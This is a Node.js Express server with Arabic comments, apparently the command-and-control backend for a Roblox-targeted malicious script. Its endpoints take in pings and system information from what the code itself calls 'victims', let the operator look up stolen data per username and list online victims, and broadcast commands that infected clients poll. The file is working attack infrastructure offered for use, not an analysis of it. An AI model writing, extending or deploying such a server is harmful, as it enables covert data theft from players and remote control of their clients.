const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

let activePlayers = {};
let chatData = { username: "System", message: "No Command", time: Date.now() };
let victimInfo = {};

// ✅ حل مشكلة CORS
app.options('*', cors());

// ✅ استقبال Ping من الضحايا
app.post('/ping', (req, res) => {
    try {
        const { username, placeId, jobId } = req.body;
        console.log(`📡 Ping من: ${username}`);
        
        if (username) {
            activePlayers[username] = {
                placeId: placeId,
                jobId: jobId,
                lastSeen: Date.now()
            };
        }
        res.json({ status: "updated" });
    } catch (error) {
        console.error("❌ خطأ في /ping:", error);
        res.status(500).json({ error: "Internal server error" });
    }
});

// ✅ استقبال معلومات النظام من الضحايا
app.post('/info', (req, res) => {
    try {
        const { username, data } = req.body;
        console.log(`📊 استقبال معلومات من: ${username}`);
        
        if (username && data) {
            victimInfo[username] = {
                ...data,
                receivedAt: Date.now(),
                timestamp: new Date().toLocaleString()
            };
            console.log(`✅ معلومات محفوظة لـ: ${username}`);
            res.json({ status: "success", message: "المعلومات مستلمة" });
        } else {
            console.log("⚠️ بيانات ناقصة في /info");
            res.status(400).json({ status: "error", message: "بيانات ناقصة" });
        }
    } catch (error) {
        console.error("❌ خطأ في /info:", error);
        res.status(500).json({ status: "error", message: "خطأ في السيرفر" });
    }
});

// ✅ جلب معلومات الضحية
app.get('/getinfo', (req, res) => {
    try {
        const username = req.query.username;
        console.log(`🔍 طلب معلومات لـ: ${username}`);
        
        if (!username) {
            return res.status(400).json({ 
                status: "error", 
                message: "اسم المستخدم مطلوب" 
            });
        }
        
        const info = victimInfo[username];
        
        if (info) {
            const now = Date.now();
            const timeDiff = now - info.receivedAt;
            
            if (timeDiff < 60000) { // 60 ثانية
                console.log(`✅ إرسال معلومات حديثة لـ: ${username}`);
                res.json({
                    status: "success",
                    data: info,
                    isFresh: true
                });
            } else {
                console.log(`⚠️ معلومات منتهية لـ: ${username}`);
                res.json({
                    status: "expired",
                    data: info,
                    isFresh: false,
                    age: Math.floor(timeDiff / 1000) + " ثانية"
                });
            }
        } else {
            console.log(`❌ لا توجد معلومات لـ: ${username}`);
            res.status(404).json({ 
                status: "not_found", 
                message: "لا توجد معلومات لهذا المستخدم" 
            });
        }
    } catch (error) {
        console.error("❌ خطأ في /getinfo:", error);
        res.status(500).json({ status: "error", message: "خطأ في السيرفر" });
    }
});

// ✅ قائمة اللاعبين النشطين
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const onlineList = Object.keys(activePlayers)
            .filter(user => (now - activePlayers[user].lastSeen) < 20000)
            .sort();
        
        console.log(`👥 اللاعبون النشطون: ${onlineList.length}`);
        res.json(onlineList);
    } catch (error) {
        console.error("❌ خطأ في /players:", error);
        res.status(500).json([]);
    }
});

// ✅ تحديث الأوامر
app.post('/update', (req, res) => {
    try {
        const { username, message } = req.body;
        if (username && message) {
            chatData = { 
                username: username, 
                message: message, 
                time: Date.now() 
            };
            console.log(`📝 أمر جديد من ${username}: ${message}`);
            res.json({ status: "command_sent" });
        } else {
            res.status(400).json({ error: "بيانات ناقصة" });
        }
    } catch (error) {
        console.error("❌ خطأ في /update:", error);
        res.status(500).json({ error: "خطأ في السيرفر" });
    }
});

// ✅ جلب آخر أمر
app.get('/data', (req, res) => {
    res.json(chatData);
});

// ✅ صفحة الاختبار
app.get('/test', (req, res) => {
    res.json({
        status: "online",
        players: Object.keys(activePlayers).length,
        messages: Object.keys(victimInfo).length,
        time: new Date().toLocaleString()
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على المنفذ ${PORT}`);
    console.log(`🌐 الرابط: http://localhost:${PORT}`);
    console.log(`📡 نقطة الاختبار: http://localhost:${PORT}/test`);
});
